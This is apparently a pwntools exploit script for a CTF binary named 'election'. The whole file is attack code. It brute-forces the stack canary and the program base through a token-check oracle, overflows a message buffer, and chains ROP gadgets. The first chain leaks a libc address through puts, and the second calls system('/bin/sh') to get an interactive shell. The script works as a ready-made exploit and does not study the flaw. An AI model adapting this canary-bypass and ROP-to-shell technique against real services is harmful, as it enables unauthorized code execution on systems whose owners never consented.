from pwn import *

context.clear(arch='x86_64')

r = process('./election')
libc = ELF('./libc.so')
elf = ELF('./election')
# r = remote('', 10180)

# some token array
token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

offset_binsh = next(libc.search('/bin/sh'))
offset_system = libc.symbols['system']
offset_puts = elf.symbols['puts']
print('offset_binsh --> ', hex(offset_binsh))
print('offset_system --> ', hex(offset_system))
print('offset_puts --> ', hex(offset_puts))

# accumulate vote for enough space to write buffer
angel_vote = 0
def vote(total_vote):
    global angel_vote
    for cnt_vote in xrange(0, total_vote):
        r.sendlineafter('>', '1')
        r.sendlineafter('9]: ', '1')

        # Angelboy: Thank you!
        r.recvline()
        angel_vote += 1

    r.sendlineafter('>', '3')

def hack_vote_ret(canary, base, step):
    # 0x00000000000011a0 : pop r14 ; pop r15 ; ret: to clear 2 variables in main function
    p = ''
    pop_r14r15_ret = base + 0x00000000000011a0
    print('pop_r14r15_ret ', hex(pop_r14r15_ret))

    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('9]:')
    r.sendline('1')

    msg = '\x87' * 0xe8
    canary = p64(canary)

    # store rbp somewhere in bss where all of them are 0 to avoid rbp corruption
    rbp = base + 0x202000
    rbp = p64(rbp)
    #                           |msg | cannary   |   rbp       |   ret            |)
    r.sendlineafter('Message: ', msg + canary    +  rbp        + p64(pop_r14r15_ret))

    if step == 0:
        print('step 0')
    elif step == 1:
        print('step 1')

    r.recvuntil('>')
    r.sendline('3')

    if step == 0:
        r.recvuntil('>')
        r.sendline('4')
        recv_str = r.recvuntil('>').split('\n')
        print('and then --> ', recv_str)
        libc_base = u64(recv_str[1] + '\0\0') - 0x201ab0
        print('libc_base --> ', hex(libc_base))
        return libc_base
    elif step == 1:
        print(r.recvuntil('>'))
        pause()
        r.sendline('3')
        recv_str = r.recvuntil('>').split('\n')
        print('and then FINALLY --> ', recv_str)
        return 0

def hack_canary_ASLR():
    canary = ''
    canary_offset = 0xb8
    guess = 0

    buf = ''
    buf += '\x87' * canary_offset

    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', buf)

    print('finished regiseter a token! ')
    while len(canary) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                canary += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1


    aslr = ''
    guess = 0

    print('canary --> ', hex(u64(canary)))
    while len(aslr) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                aslr += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1

    print('ASLR base --> ', hex(u64(aslr) - 0x1140))
    return u64(canary), u64(aslr) - 0x1140

# craft the rop for libc base
def rop_libc_base(canary, base):
    p = ''

    # 0x00000000000011a3 : pop rdi ; ret: to get rdi
    pop_rdi = base + 0x11a3
    p += p64(pop_rdi)

    # 0x201fe0 <__libc_start_main@GLIBC_2.2.5>, assign this to rdi
    libc_start_main = base + 0x201fe0
    p += p64(libc_start_main)

    # puts(libc_start_main)
    puts = base + offset_puts
    p += p64(puts)

    # return to main function
    addr_main = base + 0xffc
    p += p64(addr_main)

    print('pop_rdi for libc_base --> ', hex(pop_rdi))
    print('libc_start_main for libc_base --> ', hex(libc_start_main))
    print('puts for libc_base --> ', hex(puts))
    print('addr_main for ret main --> ', hex(addr_main))
    print('ROP for libc_base --> ', p)
    return p

def rop_shell(canary, base, libc_base):
    p = ''

    pop_rdi = base + 0x11a3
    p += p64(pop_rdi)

    bin_sh = libc_base + offset_binsh
    p += p64(bin_sh)

    system = libc_base + offset_system
    p += p64(system)

    print('bin_sh for pwn --> ', hex(bin_sh))
    print('system for pwn --> ', hex(system))

    return p

def write_token(p):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('token: ')
    r.sendline('\x00' * 0xb8)
    print('finished clearing token')

    # write the ROP of leaking libc in token
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('token: ')
    r.sendline(p)
    print('finished writing payload token')

def main():
    # brute force finding canary, and some ASLR-shit
    pause()
    canary, base = hack_canary_ASLR()

    # vote for writing more buffer
    for i in xrange(0, 26):
        r.sendlineafter('>', '2')
        r.sendlineafter('token: ', token[i])
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token[i])

        if i < 25:
            vote(10)
        else:
            vote(5)

    p1 = rop_libc_base(canary, base)
    write_token(p1)
    r.sendlineafter('>', '1')
    r.sendthen('Token: ', p1)

    print('base for hack_vote_ret --> ', hex(base))
    libc_base = hack_vote_ret(canary, base, 0)

    p2 = rop_shell(canary, base, libc_base)
    write_token(p2)
    r.sendlineafter('>', '1')
    r.sendthen('Token: ', p2)
    hack_vote_ret(canary, base, 1)

main()
r.interactive()
r.close()
